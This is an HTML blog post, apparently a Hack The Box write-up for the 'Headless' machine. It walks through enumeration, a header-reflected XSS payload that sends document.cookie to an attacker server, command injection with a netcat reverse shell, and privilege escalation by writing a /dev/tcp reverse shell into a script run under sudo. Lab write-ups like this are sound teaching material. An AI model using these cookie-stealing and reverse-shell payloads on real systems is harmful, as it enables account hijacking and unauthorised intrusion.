@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>HTB Headless Guide</title>
+  <link rel="stylesheet" href="/static/css/styles.css"/>
+</head>
+<body>
+  <div class="container">
+    <header class="post-header">
+      <h1>HTB Headless Guide</h1>
+      <div class="post-meta">
+        <span class="date">2024-05-17</span> —
+        <span class="tags"><span class="tag">HTB</span><span class="tag">XSS</span><span class="tag">cookies</span></span>
+      </div>
+      <img class="post-banner" src="/static/images/htb_headless_guide_banner.png" alt="Imagem do post"/>
+    </header>
+    <article class="post-body">
+      <p>Headless is a Hack The Box machine that has a website that notify us that it is under construction, by enumerating the directories we can find a directory called support, where we can send some tickets and suggestions to the page, there we can use an interesting behavior of the page to exploit a XSS vulnerability to steal some cookies. Then we will have access to an admin page called dashboard, there we can use a remote code execution to get a shell on the machine. The privilege escalation part we can use a file that we have permission to write on and the file can be executed as sudo.</p>
+<h2>Info</h2>
+<p>The information provided on this site is intended for educational purposes only. While we strive to offer accurate and up-to-date content regarding hacking and security, we cannot be held responsible for any misuse or illegal activity conducted with the knowledge gained from this site. Users are solely responsible for their actions and should use this information ethically and within the boundaries of the law.
+<img alt="Headless.png|600" src="/static/images/htb_headless_guide_1.png|600"/></p>
+<h2>Nmap Scan</h2>
+<p>As usual, we can start with a nmap scan.</p>
+<pre><code>┌──(kali㉿atropos)-[~/htb/machines/headless]
+└─$ nmap 10.10.11.8 -sC -sV -oA nmap1 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 17:46 EDT
+Nmap scan report for 10.10.11.8
+Host is up (0.16s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
+|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
+5000/tcp open  upnp?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/2.2.2 Python/3.11.2
+|     Date: Fri, 17 May 2024 21:47:01 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 2799
+|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="UTF-8"&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+|     &lt;title&gt;Under Construction&lt;/title&gt;
+|     &lt;style&gt;
+|     body {
+|     font-family: 'Arial', sans-serif;
+|     background-color: #f7f7f7;
+|     margin: 0;
+|     padding: 0;
+|     display: flex;
+|     justify-content: center;
+|     align-items: center;
+|     height: 100vh;
+|     .container {
+|     text-align: center;
+|     background-color: #fff;
+|     border-radius: 10px;
+|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
+|   RTSPRequest: 
+|     &lt;!DOCTYPE HTML&gt;
+|     &lt;html lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="utf-8"&gt;
+|     &lt;title&gt;Error response&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;Error response&lt;/h1&gt;
+|     &lt;p&gt;Error code: 400&lt;/p&gt;
+|     &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;
+|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port5000-TCP:V=7.94SVN%I=7%D=5/17%Time=6647D056%P=x86_64-pc-linux-gnu%r
+SF:(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
+SF:x20Python/3\.11\.2\r\nDate:\x20Fri,\x2017\x20May\x202024\x2021:47:01\x2
+SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
+SF:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Z
+SF:fs;\x20Path=/\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\
+SF:x20lang=\"en\"&gt;\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\"UTF-8\"&gt;\n\
+SF:x20\x20\x20\x20&lt;meta\x20name=\"viewport\"\x20content=\"width=device-wid
+SF:th,\x20initial-scale=1\.0\"&gt;\n\x20\x20\x20\x20&lt;title&gt;Under\x20Construct
+SF:ion&lt;/title&gt;\n\x20\x20\x20\x20&lt;style&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20b
+SF:ody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\
+SF:x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20di
+SF:splay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justif
+SF:y-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x20
+SF:0,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"&lt;!DOCTYP
+SF:E\x20HTML&gt;\n&lt;html\x20lang=\"en\"&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20
+SF:\x20\x20\x20\x20\x20&lt;meta\x20charset=\"utf-8\"&gt;\n\x20\x20\x20\x20\x20\x
+SF:20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x
+SF:20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20resp
+SF:onse&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;
+SF:\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20vers
+SF:ion\x20\('RTSP/1\.0'\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\
+SF:x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x
+SF:20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 122.08 seconds
+</code></pre>
+<h2>Directory Enumeration</h2>
+<p>As we saw on the nmap scan, we have an HTTP server on port 5000, lets make a directory enumeration.</p>
+<pre><code>┌──(kali㉿atropos)-[~/htb/machines/headless]
+└─$ dirb http://10.10.11.8:5000
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri May 17 18:20:09 2024
+URL_BASE: http://10.10.11.8:5000/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.11.8:5000/ ----
++ http://10.10.11.8:5000/dashboard (CODE:500|SIZE:265)                                                                                                     
++ http://10.10.11.8:5000/support (CODE:200|SIZE:2363)                                                                                                      
+
+-----------------
+END_TIME: Fri May 17 18:46:28 2024
+DOWNLOADED: 4612 - FOUND: 2
+</code></pre>
+<p>We found the page <code>/dashboard</code> that returned code 500, but trying to access that page on the browser, we can see that we don't have the right permissions to access that page, we need to remember that down the line if we get access to some admin cookies.</p>
+<h2>Web Application</h2>
+<p>When we get on the home directory, we see that the site is under construction and will be released in 25 days.
+<img alt="headless_homepage.png" src="/static/images/htb_headless_guide_2.png"/>
+On our directory enumeration we found a page called <code>/suport</code>, we can take a look on it.
+<img alt="headless_form.png" src="/static/images/htb_headless_guide_3.png"/>
+Here we can see multiple input fields, so we can try some XSS, same as in the [[IClean]], we can use this payload:</p>
+<pre><code>&lt;img src=x onerror=fetch("http://IP:PORT/"+document.cookie);&gt;
+</code></pre>
+<blockquote>
+<p>We can also find many others XSS payloads in <a href="https://github.com/payloadbox/xss-payload-list">this</a> GitHub repository.</p>
+</blockquote>
+<p>Here we can use <code>Burpsuite</code> to capture the request and change the fields as we want, in this case we can use the payload on the message field:
+<img alt="headless_XSS1.png" src="/static/images/htb_headless_guide_4.png"/>
+But there is a problem, when we do this we get a Hacking Attempt Detected :o
+<img alt="headless_hacking_detected.png" src="/static/images/htb_headless_guide_5.png"/></p>
+<center><iframe allowfullscreen="" class="giphy-embed" frameborder="0" height="266" src="https://giphy.com/embed/jmSjPi6soIoQCFwaXJ" width="480"></iframe><p><a href="https://giphy.com/gifs/cbs-swat-shemar-moore-cbs-jmSjPi6soIoQCFwaXJ">via GIPHY</a></p></center>
+<p>But we can use this to our advantage, notice the Client Request Information, this is reflecting out request header, so, we can purposefully use this message and insert the XSS payload on the header, that way, if it is not sanitized as the input fields on the page we will get out XSS properly executed, and even better, we will have a better chance for it to be seeing by a admin.
+<img alt="headless_XSS_reflect_head.png" src="/static/images/htb_headless_guide_6.png"/>
+Now we can use the same payload again and place it on the message input on the POST request, but this time we can place it on any of the header parameters. That way, as we can see, our XSS is reflected to the page. To actually steal the cookies, we need to setup a http server on our machine, for this we can use python with the command <code>python3 -m http.server 8081</code>:</p>
+<pre><code>┌──(kali㉿atropos)-[~]
+└─$ python3 -m http.server 8081
+Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
+10.10.11.8 - - [17/May/2024 18:35:59] code 404, message File not found
+10.10.11.8 - - [17/May/2024 18:35:59] "GET /is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 404 -
+</code></pre>
+<p>Now we have the cookie <code>is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</code>, we can directly place this on our browser, or we change it on <code>Burpsuite</code>, in this case I will place it on the browser, is more convenient that way.</p>
+<h2>Getting a Shell</h2>
+<p>Now we can go to the <code>/dashboard</code> page and see what we can use there. On the page we have a simple page with a button to generate a health report of the site, on this we use a parameter date to do some stuff on the server. This looks like it's vulnerable to command injection. In this case I think the machine was working strange after someone tinkered with it in some weird way and the bash reverse shell was not working, so I used the <code>netcat</code> reverse shell, <code>nc 10.10.14.200 9001 -e /bin/bash</code>:
+<img alt="headless_reverse_shell.png" src="/static/images/htb_headless_guide_7.png"/>
+We can set up a <code>netcat</code> listener on our end to catch that connection, and with that we have shell access, and we can get our user flag:</p>
+<pre><code>bash-5.2$ cd /home
+bash-5.2$ ls
+dvir
+bash-5.2$ cd dvir/
+bash-5.2$ ls
+app  geckodriver.log  user.txt
+bash-5.2$ cat user.txt 
+</code></pre>
+<h2>Privilege Escalation</h2>
+<p>As always, the simplest thing we can try to run is <code>sudo -l</code> and check if we can run anything on the system with sudo without a password, and in this case we can.</p>
+<pre><code class="language-bash">bash-5.2$ sudo -l
+Matching Defaults entries for dvir on headless:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck
+</code></pre>
+<p>The first thing we can check is a <code>ls -al</code> on the file and see if the user has write permission, in this case, if the user has write permision on the file, we can add a reverse shell on the lasts lines of it and there we have our privilege escalation, but this is not the case. So, we can cat this file to see what it does:</p>
+<pre><code class="language-bash">bash-5.2$ cat /usr/bin/syscheck
+#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+  exit 1
+fi
+
+last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+
+disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+/usr/bin/echo "Available disk space: $disk_space"
+
+load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+/usr/bin/echo "System load average: $load_average"
+
+if ! /usr/bin/pgrep -x "initdb.sh" &amp;&gt;/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2&gt;/dev/null
+else
+  /usr/bin/echo "Database service is running."
+fi
+
+exit 0
+bash-5.2$ 
+</code></pre>
+<p>As we can see, this bash script collects some information on various places on the system and echo then, but more than that, the script also executes another bash script named <code>initdb.sh</code>, checking our permission on this file we can write on it, so that will be easy, we can add a reverse shell on it and execute the <code>syscheck</code> as sudo:</p>
+<pre><code>bash-5.2$ echo "bash -i &gt;&amp; /dev/tcp/10.10.14.200/9002 0&gt;&amp;1" &gt; initdb.sh
+bash-5.2$ chmod +x initdb.sh
+</code></pre>
+<p>Before we execute the <code>syscheck</code> as sudo we need to set up another <code>netcat</code> listener on other port to get this connection. Once that's done, we will have a root shell and can get our root flag:</p>
+<pre><code>┌──(kali㉿atropos)-[~/htb/machines/headless]
+└─$ nc -lvnp 9002
+listening on [any] 9002 ...
+connect to [10.10.14.200] from (UNKNOWN) [10.10.11.8] 37592
+root@headless:/home/dvir/app# cd /root
+cd /root
+root@headless:~# cat root.txt   
+cat root.txt 
+</code></pre>
+    </article>
+  </div>
+</body>
+</html>
